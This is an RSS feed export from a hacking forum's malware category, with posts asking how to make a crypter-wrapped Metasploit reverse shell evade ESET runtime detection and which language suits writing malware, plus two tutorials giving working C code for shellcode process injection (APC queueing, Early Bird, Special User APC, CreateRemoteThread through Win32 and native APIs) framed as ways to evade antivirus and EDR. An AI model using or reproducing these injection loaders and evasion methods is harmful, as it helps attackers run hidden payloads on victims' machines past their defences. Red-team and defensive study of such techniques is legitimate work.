<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Malware - 0x00sec - The Home of the Hacker</title>
    <link>https://d.clarkee.co.uk/c/malware/56</link>
    <description>Topics in the &#39;Malware&#39; category </description>
    
      <lastBuildDate>Thu, 08 Apr 2021 10:30:27 +0000</lastBuildDate>
      <atom:link href="https://d.clarkee.co.uk/c/malware/56.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>Antivirus runtime bypass</title>
          <dc:creator><![CDATA[nulled]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hello,<br>
A few weeks ago I started learning how crypters work and I decided to write my own. I chose C# language to write it. I bypassed most of the scantime detections (despite Avira and a few others) but I am really struggling with runtime. When I execute stub with a metasploit reverse shell inside everything goes well until the client tries to connect to server. At this moment process of reverse shell is being killed and flagged as detected.(I am trying to bypass Eset runtime because this is an antivirus software which I have installed on my PC) I found various techniques to evade runtime but none of them work. Techniques that I use: amsi.dll bypass (makes Eset go crazy but it’s still able to end reverse shell process), thread stalling, antihooking which I added to RunPE (<a href="https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/" class="inline-onebox" rel="noopener nofollow ugc">Bypassing Windows Defender Runtime Scanning</a>). Could someone give me techniques/tips to bypass runtime detections to be able to open reverse shell without it being killed by antivirus?</p>
            <p><small>13 posts - 6 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/antivirus-runtime-bypass/25574">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/antivirus-runtime-bypass/25574</link>
          <pubDate>Thu, 08 Apr 2021 10:30:27 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-25574</guid>
          <source url="https://d.clarkee.co.uk/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
        </item>
        <item>
          <title>Best language for write malware</title>
          <dc:creator><![CDATA[CyberSecurity]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hi, which are the best language for write malware?<br>
I know C, python and golang, it’s necessary Assembly?</p>
            <p><small>13 posts - 11 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/best-language-for-write-malware/25514">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/best-language-for-write-malware/25514</link>
          <pubDate>Mon, 05 Apr 2021 13:17:39 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-25514</guid>
          <source url="https://d.clarkee.co.uk/t/best-language-for-write-malware/25514.rss">Best language for write malware</source>
        </item>
        <item>
          <title>Hello Friends, Been a While. Anyone have some guidance on macOS Malware Analysis?</title>
          <dc:creator><![CDATA[hartescout]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>So, basically the title of the post. Recently took on a full-time position on a threat research/hunt team and have become interested in filling a gap in macOS reverse engineering/Malware Analysis expertise. Zero2Auto and these forums and Discord are huge part in why I have this position so I thought I should ask the community.</p>
<p>Any guidance? Some initial searches have turned up some decent-looking information but I haven’t found any books specifically focused on the architecture and or OS.</p>
<p>Would be much appreciated!</p>
            <p><small>8 posts - 8 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/hello-friends-been-a-while-anyone-have-some-guidance-on-macos-malware-analysis/24700">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/hello-friends-been-a-while-anyone-have-some-guidance-on-macos-malware-analysis/24700</link>
          <pubDate>Sat, 23 Jan 2021 18:54:04 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-24700</guid>
          <source url="https://d.clarkee.co.uk/t/hello-friends-been-a-while-anyone-have-some-guidance-on-macos-malware-analysis/24700.rss">Hello Friends, Been a While. Anyone have some guidance on macOS Malware Analysis?</source>
        </item>
        <item>
          <title>Process Injection: APC Injection</title>
          <dc:creator><![CDATA[alion]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>APC Injection is another sub-technique of Process Injection like remote thread injection. if this subject is totally new to you I strongly recommend you to read my previous post that is about <a href="https://aliongreen.github.io/posts/remote-thread-injection.html" rel="noopener nofollow ugc">remote thread injection</a>. In this post, we are going to talk about APC Injection in remote threads. we want to find out what APC is and how we can use it to run our malicious code.</p>
<p>there are different ways of using APCs to achieve process injection. we are going to try three different ways of using it.</p>
<ul>
<li>Simple APC Injection (Injection APC into all of the target process threads)</li>
<li>Early Bird Injection</li>
<li>Special User APC</li>
</ul>
<h2><a name="p-63414-what-is-apc-1" class="anchor" href="https://d.clarkee.co.uk#p-63414-what-is-apc-1"></a>What is APC?</h2>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls" rel="noopener nofollow ugc">Asynchronous Procedure Call</a> or APC is a function to run code in the context of another thread. every thread has it’s own queue of APCs. if the thread enters an alertable state it starts to do APC jobs in the form of first in first out (FIFO). A thread can enters an alertable state by using <strong>SleepEx</strong>, <strong>SignalObjectAndWait</strong>, <strong>MsgWaitForMultipleObjectsEx</strong>, <strong>WaitForMultipleObjectsEx</strong>, or <strong>WaitForSingleObjectEx</strong> functions.</p>
<pre><code class="lang-auto">+---------------------+                                                 +---------------------+       
|                     |                                                 |                     |       
|                     |                                                 |                     |       
|                     |                                                 |                     |       
|   Malware Process   |                                                 |   svchost process   |       
|                     |               1 allocating space                |                     |       
|                     |-----------------------------------------------&gt; |---------------------|       
|                     |                                                 |                     |       
|                     |                                                 |      shellcode      |       
|                     |               2 writing shellcode               |                     |       
+---------------------+-----------------------------------------------&gt; +---------------------+       
           |                                                                     ^                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     v                    
           |                                                     +-----------------------------+      
           |                                                     |                             |      
           |                                                     |                             |      
           |                                                     |         thread 1112         |      
           |                                                     |                             |      
           |                                                     |-----------------------------|      
           |                                                     |              |              |      
           |             3 Queue an APC to thread 1112           |exec shellcode|other jobs... |      
           +----------------------------------------------------&gt;|              |              |      
                                                                 +-----------------------------+      
                                                                           APC Queue                                              
</code></pre>
<p><em>figure 1 - APC injection to a remote thread</em></p>
<h2><a name="p-63414-simple-apc-injection-or-queue-an-apc-into-all-the-threads-2" class="anchor" href="https://d.clarkee.co.uk#p-63414-simple-apc-injection-or-queue-an-apc-into-all-the-threads-2"></a>Simple APC Injection or Queue an APC into All the threads</h2>
<p>The is the simplest implementation of APC injection. as there is no function to find if a thread is alertable or not the easiest way is to queue an APC into all of the target process threads and we can assume one of the threads is alertable and run our APC job. <strong>svchost</strong> process is a good choice as it almost always has alertable threads. the problem with this technique is that it’s unpredictable somehow, and in many cases, it can run shellcode multiple times.</p>
<p>These are the steps to implement simple APC injection:</p>
<p>1- Find the target process id</p>
<p>2- Allocate space in the target process for your shellcode</p>
<p>3- Write your shellcode in the allocated space.</p>
<p>4- Find target process threads</p>
<p>5- Queue an APC to all of them to execute your shellcode</p>
<p>For the first step, we need to find the process id of our target process. if you have read the <a href="https://aliongreen.github.io/posts/remote-thread-injection.html" rel="noopener nofollow ugc">previous post</a> you know how to find a process id of an arbitrary process. here we have created a function called <strong>find_process</strong> that returns the target process id.</p>
<p>Then, we need to allocate memory space for our shellcode in the target process using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex" rel="noopener nofollow ugc">VirtualAllocEx</a> function. we should allocate this location with <strong>PAGE_EXECUTE_READWRITE</strong> (Execute, Read, Write) permissions. most of the time allocating memory location with <strong>RWX</strong> permission could trigger EDR/AV. instead, we can allocate the location with <strong>PAGE_READWRITE</strong> (Read, Write) permissions at first, and after writing the shellcode we can change the permission of the memory location to <strong>PAGE_EXECUTE_READ</strong> (Execute, Read) using <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex" rel="noopener nofollow ugc">VirtualProtectEx</a> function. but remember that your shellcode should not be self modifying because in that case it needs to write into the memory location and it doesn’t have the write permission to do it.</p>
<pre data-code-wrap="c"><code class="lang-c">DWORD OldProtect = 0;
DWORD target_process_id = find_process(TARGET_PROCESS_NAME);
HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, target_process_id);
LPVOID target_process_buffer = VirtualAllocEx(target_process_handle, NULL, (SIZE_T) sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(target_process_handle, target_process_buffer, shellcode, (SIZE_T) sizeof(shellcode), NULL);
VirtualProtectEx(target_process_handle, target_process_buffer, (SIZE_T) sizeof(shellcode), PAGE_EXECUTE_READ, &amp;OldProtect);
</code></pre>
<p>Then we should get the list of all the system threads using <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" rel="noopener nofollow ugc">CreateToolhelp32Snapshot</a> with <strong>TH32CS_SNAPTHREAD</strong> flag and iterate through all the threads using <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first" rel="noopener nofollow ugc">Thread32First</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next" rel="noopener nofollow ugc">Thread32Next</a> functions to find the threads of our victim process. both of these functions get a pointer to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32" rel="noopener nofollow ugc">THREADENTRY32</a> struct that will be filled with the information about the thread after calling these functions. we compare the <strong>th32OwnerProcessID</strong> member of our <strong>THREADENTRY32</strong> instant with the target process id to see if the thread belongs to our victim process. this member actually shows the process id of the thread owner.</p>
<p>If the thread belongs to our target process we queue an APC to the thread using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc" rel="noopener nofollow ugc">QueueUserAPC</a> function. the first parameter should be a pointer to the function that we want to execute which is a pointer to our shellcode and the second parameter is a handle to the remote thread.</p>
<pre data-code-wrap="c"><code class="lang-c">THREADENTRY32 te;
te.dwSize = sizeof(THREADENTRY32);
	
HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

for (Thread32First(snapshot, &amp;te); Thread32Next(snapshot, &amp;te);) {
	if (te.th32OwnerProcessID == target_process_id) {
		
		HANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, te.th32ThreadID);
			
		if (QueueUserAPC((PAPCFUNC)target_process_buffer ,target_thread_handle, NULL)) {
			printf("Queuing an APC to thread id %d\n", te.th32ThreadID);
		}
			
	}
}
</code></pre>
<p>this was the implementation of Simple APC Injection using Win32 APIs. we can also implement this technique using Native APIs or Syscalls. in the previous post we worked with most of the Native APIs that could be used here. now we have two new native APIs that we have not already used. <strong>OpenThread</strong> and <strong>QueueUserAPC</strong> functions are the two new APIs here. the Native APIs equivalent to them are <strong>NtOpenThread</strong> and <strong>NtQueueApcThread</strong>, respectively. you can find their definition and usage in the PoC on my <a href="https://github.com/AlionGreen/apc-injection/blob/main/NTAPI/main.c" rel="noopener nofollow ugc">Github</a> account.</p>
<h2><a name="p-63414-early-bird-injection-3" class="anchor" href="https://d.clarkee.co.uk#p-63414-early-bird-injection-3"></a>Early Bird Injection</h2>
<p>We already mentioned that a thread can only run APC jobs if it enters an alertable state. there is also one other way to run APC jobs. <strong>NtTestAlert</strong> is a function that checks the APC queue of the current thread and if there is any queued job it runs them to empty the queue. when a thread starts the <strong>NtTestAlert</strong> is called before anything. so if you queue your APC at the beginning state of a thread you can safely run your job.</p>
<blockquote>
<p>Note: If you want to inject your shellcode into the local process you can APC to the current thread and call the <strong>NtTestAlert</strong> function to execute the shellcode.</p>
</blockquote>
<p>In Early Bird, we start by creating a process (like svchost) in a suspended state, then queuing an APC to the main thread, and resuming the thread afterward. So, before the thread starts to execute the main code it calls the <strong>NtTestAlert</strong> function to empty the APC queue of the current thread and run the queued jobs. this technique had been used to evade the AV/EDR hooking process. because it tries to run the malicious code before the AV/EDR had a chance to place its hook in the newly created process.</p>
<p>First, we need to open our target process using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" rel="noopener nofollow ugc">CreateProcessA</a> function. we should provide the path of our executable and a pointer to <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa" rel="noopener nofollow ugc">STARTUPINFOA</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information" rel="noopener nofollow ugc">PROCESS_INFORMATION</a> structs as arguments. we should also take the <strong>CREATE_SUSPENDED</strong> value for the <strong>dwCreationFlags</strong> parameter to create the process in a suspended state.</p>
<pre data-code-wrap="c"><code class="lang-c">STARTUPINFOA si = { 0 };
PROCESS_INFORMATION pi = { 0 };

CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);
</code></pre>
<p>if the function succeeds to create the new process there will be a handle to the newly created process and thread respectively in <strong>hProcess</strong> and <strong>hThread</strong> member of the <strong>pi</strong> object. then, we allocate memory space for our shellcode in the target process and write the shellcode in it, and we queue our APC to the main thread and resume the thread.</p>
<pre data-code-wrap="c"><code class="lang-c">LPVOID target_process_buffer = NULL;
target_process_buffer = VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, target_process_buffer, shellcode, (SIZE_T)sizeof(shellcode),NULL);

QueueUserAPC((PAPCFUNC)target_process_buffer, pi.hThread, NULL);
ResumeThread(pi.hThread);
</code></pre>
<h2><a name="p-63414-special-user-apc-or-ntqueueapcthreadex-4" class="anchor" href="https://d.clarkee.co.uk#p-63414-special-user-apc-or-ntqueueapcthreadex-4"></a>Special User APC or NtQueueApcThreadEx</h2>
<p>Special User APC is a new system call that has been added since the RS5 release of windows and could be achieved by using the <strong>NtQueueApcThreadEx</strong> function. normally, a thread can only run APCs when it enters an alertable state. but using Special User APC we can force a thread to run APC without entering an alertable state. but remember using special user APC could be dangerous in some cases and lead the thread to deadlock. read <a href="https://repnz.github.io/posts/apc/user-apc/" rel="noopener nofollow ugc">repnz</a> post for more information.</p>
<p>We implement Special User APC using syscalls. We use <a href="https://github.com/jthuraisamy/SysWhispers" rel="noopener nofollow ugc">SysWhisper</a> to generate syscalls and their definition. then we add the <strong>header</strong> and <strong>asm</strong> files to our project. you should also enable <strong>MASM</strong> in the visual studio for your project.</p>
<pre data-code-wrap="bash"><code class="lang-bash">python syswhispers.py -f NtQueueApcThreadEx,NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtOpenThread --version 10 -o syscalls
</code></pre>
<p>All the steps that we take to utilize Special User APC for APC injection are like the Simple APC Injection. the only difference is that we don’t APC to all threads in this case. we use the <strong>NtQueueApcThreadEx</strong> function to queue a special APC to the first thread that belongs to our target process.</p>
<pre data-code-wrap="c"><code class="lang-c">typedef enum _QUEUE_USER_APC_FLAGS {
	QueueUserApcFlagsNone,
	QueueUserApcFlagsSpecialUserApc,
	QueueUserApcFlagsMaxValue
} QUEUE_USER_APC_FLAGS;


typedef union _USER_APC_OPTION {
	ULONG_PTR UserApcFlags;
	HANDLE MemoryReserveHandle;
} USER_APC_OPTION, *PUSER_APC_OPTION;
</code></pre>
<p>then we initialize the structs and call the function.</p>
<pre data-code-wrap="c"><code class="lang-c">USER_APC_OPTION UserApcOption;
UserApcOption.UserApcFlags = QueueUserApcFlagsSpecialUserApc;

for (Thread32First(snapshot, &amp;te); Thread32Next(snapshot, &amp;te);) {
	if (te.th32OwnerProcessID == target_process_id) {


		HANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, te.th32ThreadID);

		NtQueueApcThreadEx(target_thread_handle, QueueUserApcFlagsSpecialUserApc, (PKNORMAL_ROUTINE)target_process_buffer, NULL, NULL, NULL);

		CloseHandle(target_thread_handle);
		break;

	}
}
</code></pre>
<p>You can find all of the PoCs for this post on my <a href="https://github.com/AlionGreen/apc-injection" rel="noopener nofollow ugc">Github</a> account.</p>
<h2><a name="p-63414-credits-5" class="anchor" href="https://d.clarkee.co.uk#p-63414-credits-5"></a>Credits</h2>
<p>Thanks to <a href="https://twitter.com/0x00dtm" rel="noopener nofollow ugc">0x00dtm</a> for helping me.</p>
<p>Thanks to <a href="https://twitter.com/_batsec_" rel="noopener nofollow ugc">batsec</a> and <a href="https://twitter.com/slaeryan" rel="noopener nofollow ugc">Upayan</a> for sharing great resources with me.</p>
<h2><a name="p-63414-references-6" class="anchor" href="https://d.clarkee.co.uk#p-63414-references-6"></a>References</h2>
<p><a href="https://repnz.github.io/posts/apc/user-apc/" rel="noopener nofollow ugc">https://repnz.github.io/posts/apc/user-apc/</a></p>
<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection" rel="noopener nofollow ugc">https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection</a></p>
<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection" rel="noopener nofollow ugc">https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection</a></p>
<p><a href="http://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1" rel="noopener nofollow ugc">http://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1</a></p>
<p><a href="https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/" rel="noopener nofollow ugc">https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/</a></p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/process-injection-apc-injection/24608">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/process-injection-apc-injection/24608</link>
          <pubDate>Sun, 17 Jan 2021 11:30:13 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-24608</guid>
          <source url="https://d.clarkee.co.uk/t/process-injection-apc-injection/24608.rss">Process Injection: APC Injection</source>
        </item>
        <item>
          <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
          <dc:creator><![CDATA[alion]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>In Every Red Team Operation, the goal of the Team is to Stay Stealthy and hide campaign operation from the blue team. From getting the initial access to hiding the C2 connections and exfiltrating data, they use various techniques and procedures to do that. The first step of every campaign is to get initial access. They use customized malware and payloads to circumvent and evade defending tools such as AVs and EDRs.</p>
<p><a href="https://attack.mitre.org/techniques/T1055/" rel="noopener nofollow ugc">Process Injection</a> is one of the techniques that is used to evade the defense mechanism. Remote Thread Injection (aka CreateRemoteThread) is one of the simple and reliable sub technique. it works by injecting the shellcode (payload) into the context of another eligible process and creates a thread for that process to run the payload.</p>
<pre><code class="lang-auto">                                                                                                   
          +-------------------+                                          +-------------------+     
          |                   |                                          |                   |     
          |                   |                                          |                   |     
          |  Notepad Process  |                                          |  Malware Process  |     
          |                   |                                          |                   |     
          |                   |           1 allocating space             |                   |     
          |-------------------| &lt;--------------------------------------  |                   |     
          |     shellcode     |                                          |                   |     
          |                   |           2 writing shellcode            |                   |     
          +-------------------+ &lt;--------------------------------------  +-------------------+     
                 ^                                                         |                       
                 |                                                         |                       
                 |                                                         |                       
                 |                                                         |                       
                 v             3 creating a remote thread to run shellcode |                       
             +---------+                                                   |                       
             |         |  &lt;------------------------------------------------+                       
             | thread  |                                                                           
             |         |                                                                           
             +---------+                                                                           
                                                                                                   
</code></pre>
<p><em>figure 1</em></p>
<p>We implement remote thread injection using standard Windows APIs, native APIs, and direct syscalls. each of these implementations has its own pros and cons. the following picture shows how standard windows APIs, Native APIs, and direct syscalls work in windows architecture.</p>
<pre><code class="lang-auto">                                  +------------------------------+                                  
                                  |                              |                                  
                      +-----------|     Application Process      |----------------+                 
                      |           |                              |                |                 
                      |           +------------------------------+                |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           | Standard Windows API         |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           v                               |                 
                      |           +------------------------------+                |                 
                      |           |                              |                |                 
       Native API     |           |          kernel32.dll        |                |                 
                      |           |                              |                |                 
                      |           +------------------------------+                |  Direct Syscalls
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           v                               |                 
                      |           +------------------------------+                |                 
                      |           |                              |                |                 
                      +---------&gt; |           Ntdll.dll          |                |                 
                                  |                              |                |                 
 User-Mode                        +------------------------------+                |                 
                                                  |                               |                 
                                                  |                               |                 
 -------------------------------------------------|-------------------------------|-----------------
                                                  |                               |                 
                                                  |                               |                 
 Kernel-Mode                                      |                               |                 
                                  +---------------v--------------+                |                 
                                  |                              |                |                 
                                  |         ntoskrnl.exe         | &lt;--------------+                 
                                  |                              |                                  
                                  +------------------------------+                                  
</code></pre>
<p><em>figure 2</em></p>
<h2>Standard Windows APIs</h2>
<h3>pros:</h3>
<ul>
<li>easy to use</li>
</ul>
<h3>cons:</h3>
<ul>
<li>detectable by most AV/EDRs</li>
</ul>
<p>we start by using standard Windows APIs as it is simpler than two other ways. First, we need to find our target process ID. We create a function called  <code>find_process</code>  that gets a process name and it uses <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" rel="noopener nofollow ugc">CreateToolhelp32Snapshot</a> API to get the list of current processes and uses <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first" rel="noopener nofollow ugc">Process32First</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next" rel="noopener nofollow ugc">Process32Next</a> to go through them one by one and compare the name of the processes with our target process.  <strong>Process32First</strong>  and  <strong>Process32Next</strong>  APIs get a pointer to <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32" rel="noopener nofollow ugc">PROCESSENTRY32</a> struct that could hold information about processes like its name and id. If it succeeds to find the process it returns its process ID.</p>
<pre><code class="lang-auto">DWORD find_process(char *process_name){

	PROCESSENTRY32 process_entry;
	process_entry.dwSize = sizeof(PROCESSENTRY32);

	//get the list of processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	//check processes to find TARGET_PROCESS_NAME
	if (Process32First(snapshot, &amp;process_entry) == TRUE){
		
        	while (Process32Next(snapshot, &amp;process_entry) == TRUE){
        		if (stricmp(process_entry.szExeFile, process_name) == 0){  
				    CloseHandle(snapshot);
				    return process_entry.th32ProcessID;
            	}
        	}
    	}

	CloseHandle(snapshot);
	return 0;
}
</code></pre>
<p>for the next step, we need to open our target process using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" rel="noopener nofollow ugc">OpenProcess</a> function. We pass our parameters including the target process id that we get from the previous step and it returns a handle to that process.</p>
<pre><code class="lang-auto">HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_process_id);
</code></pre>
<p>now we need to allocate space for our shellcode in the target process using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex" rel="noopener nofollow ugc">VirtualAllocEx</a> function. we should allocate this space with  <strong>PAGE_EXECUTE_READWRITE</strong>  (Read, Write, Execute) permission. this function returns the base address of the allocated region.</p>
<pre><code class="lang-auto"> LPVOID remote_process_buffer = VirtualAllocEx(target_process_handle, NULL, sizeof(buf), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
</code></pre>
<p>now we should write our shellcode into our allocated memory region using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" rel="noopener nofollow ugc">WriteProcessMemory</a> function.</p>
<pre><code class="lang-auto">WriteProcessMemory(target_process_handle, remote_process_buffer, buf, sizeof(buf), NULL);
</code></pre>
<p>after all, it’s time to create a thread in the target process and run the shellcode that we previously wrote into a memory page. we use the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread" rel="noopener nofollow ugc">CreateRemoteThread</a> function. we should also pass 0 as the  <strong>dwCreationFlags</strong>  parameter to run the thread immediately after creation.</p>
<pre><code class="lang-auto">CreateRemoteThread(target_process_handle, NULL, 0,(LPTHREAD_START_ROUTINE) remote_process_buffer,NULL,0, NULL);
</code></pre>
<p>to compile the code in kali, we use  <strong>MinGW</strong>.</p>
<pre><code class="lang-auto">x86_64-w64-mingw32-gcc main.c -o rti.exe
</code></pre>
<p>we send the output to our windows machine and run it. if we open  <strong>process hacker</strong>  and take a look at the  <strong>notepad.exe</strong>  process. in the memory section there is only one memory page with RWX permission which is suspicious. if we open it we can see our shellcode inside it.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85.png" data-download-href="/uploads/short-url/effXrKa174oyvibfBufispBnHCJ.png?dl=1" title="process-hacker-notepad" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_501x500.png" alt="process-hacker-notepad" data-base62-sha1="effXrKa174oyvibfBufispBnHCJ" width="501" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_501x500.png, https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_751x750.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_1002x1000.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_10x10.png"></a></div><br>
<em>image 1</em><p></p>
<h2>Native API</h2>
<h3>pros:</h3>
<ul>
<li>bypass some of the AV/EDRs</li>
</ul>
<h3>cons:</h3>
<ul>
<li>hard to use</li>
<li>still detectable by most AV/EDRs</li>
<li>may not work on all windows versions</li>
</ul>
<p>In order to interact with the operating system, programmers use Standard APIs (Win 32 APIs) that are recommended by Microsoft. Standard Windows APIs are a kind of wrapper for Native APIs. Native APIs or Undocumented APIs could be found in the ntdll.dll library. Microsoft doesn’t recommend using these APIs. if you look at the second diagram you can see how these APIs are working. native APIs also interact with os kernel using syscalls. Microsoft uses this architecture because it can change the OS kernel without affecting the standard APIs.</p>
<p>Native APIs are also called undocumented APIs because you can’t usually find official documentats to use them. we can find a way of using them mostly by seeing other people’s code, unofficial documents, or researching around them to see how they work. most of these APIs names start with Nt or Zw.</p>
<p>In the previous section, we used standard APIs to do our job. here we go one layer deeper and use native APIs. we have a couple of more steps to use NTAPIS. for using Native APIs. first, we need to load the ntdll.dll into our malware process. then we should define function pointers with the exact same format as the original function that we want to use, and export the base address of these functions to initialize these pointers.</p>
<p>for loading ntdll.dll or any other dll dynamically into our running process, we use the <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw" rel="noopener nofollow ugc">LoadLibraryW</a> function and it returns a handle to that library.</p>
<pre><code class="lang-auto">HMODULE hNtdll = LoadLibraryW(L"ntdll");
</code></pre>
<p>then we define our function pointer type and get the base address of the function using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" rel="noopener nofollow ugc">GetProcAddress</a> function and assign it to the pointer. here is the example for <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess" rel="noopener nofollow ugc">NtOpenProcess</a>.</p>
<pre><code class="lang-auto">typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
</code></pre>
<p>as you can see we defined our function type with the same parameters as the  <strong>NtOpenProcess</strong>  function. you should do this for all  <strong>NtWriteVirtualMemory</strong> ,  <strong>NtAllocateVirtualMemory</strong> ,  <strong>NtCreateThreadEx</strong>  functions. for finding the parameter and structure of an undocumented api you can use <a href="http://undocumented.ntinternals.net/" rel="noopener nofollow ugc">http://undocumented.ntinternals.net/</a>. but you may not find all the function definitions in it. you can search for it and see other people’s codes or even looking inside the ntdll.dll library to see how it exactly works.</p>
<h3>NtOpenProcess</h3>
